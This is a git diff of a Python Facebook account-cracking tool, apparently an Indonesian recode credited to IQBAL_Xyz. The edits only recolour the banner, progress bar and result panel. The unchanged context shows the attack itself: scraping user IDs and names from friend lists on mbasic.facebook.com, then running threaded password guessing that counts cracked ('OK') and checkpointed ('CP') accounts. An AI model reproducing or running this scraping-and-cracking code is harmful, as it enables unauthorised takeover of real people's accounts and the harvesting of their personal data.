@@ -81,14 +81,14 @@ class Logo:
 	def logonya(self):
 		self.bersihkan_layar()
 		prints(Panel(f"""{color_text}  
-                            {M2}██████████████████████[/]
-                            {M2}██████████████████████[/]
-                            {P2}██████████████████████[/]
-                            {P2}██████████████████████[/]
-                            Made By {U2}Indonesia {U2}Coder
-{U2}╭──────────────────────╮{U2}╭───────────────╮{U2}╭────────────────────────────╮
-{U2}│ {U2}Author : mhmmdibal {U2}│{U2}│ {U2}Version : 3.1 {U2}│{U2}│ {U2}Recode By : IQBAL_Xyz {U2}       │
-{U2}╰──────────────────────╯{U2}╰───────────────╯{U2}╰────────────────────────────╯""",width=80,style=f"{color_panel}"))
+                         {M2}██████████████████████[/]
+                         {M2}██████████████████████[/]
+                         {P2}██████████████████████[/]
+                         {P2}██████████████████████[/]
+                          Made By {M2}Indonesia {P2}Coder
+   {U2}╭──────────────────────╮{U2}╭───────────────╮{U2}╭────────────────────────────╮
+   {U2}│{H2}Author : mhmmdibal{H2}│{U2}│{H2}Versi :3.1{H2}│{U2}│ {H2}Recode By : IQBAL_Xyz {H2}  │
+   {U2}╰──────────────────────╯{U2}╰───────────────╯{U2}╰────────────────────────────╯""",width=80,style=f"{color_panel}"))
 	
 	###----------[ BAGIAN LOGIN ]---------- ###
 class Login:
@@ -246,7 +246,7 @@ class Dump:
 					else:uid = "".join(bs4.re.findall("/(.*?)\?",z.get("href")));nama = z.text
 					if uid+"<=>"+nama in tampung:pass
 					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {M2}• {K2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
+					console.print(f" {U2}• {U2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
 			for x in url.find_all("a",href=True):
 				if "Lihat Teman Lain" in x.text:
 					self.Dump_Publik("https://mbasic.facebook.com/"+x.get("href"))
@@ -341,12 +341,12 @@ class Crack:
 						fall.submit(self.metode_api,user,pwx)
 					except:
 						fall.submit(self.metode_api,user,pwx)
-		prints(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
+		prints(Panel(f"""{U2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{H2} CP : {U2}{len(self.cp)}{M2}""",width=80,padding=(0,8),style=f"{color_panel}"))
 		sys.exit()
 							
 	###----------[ METODE API ]---------- ###
 	def metode_api(self,email,pwx):
-		prog.update(des,description=f" {U2}•{K2}{U2}[IQBAL_Xyz]•{K2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{U2} CP : {M2}{len(self.cp)}{U2}")
+		prog.update(des,description=f" {U2}•{U2}{U2}[IQBAL_Xyz]•{H2} {str(self.loop)}/{len(tampung)} OK : {U2}{len(self.ok)}{U2} CP : {M2}{len(self.cp)}{U2}")
 		prog.advance(des)
 		try:
 			for pw in pwx:
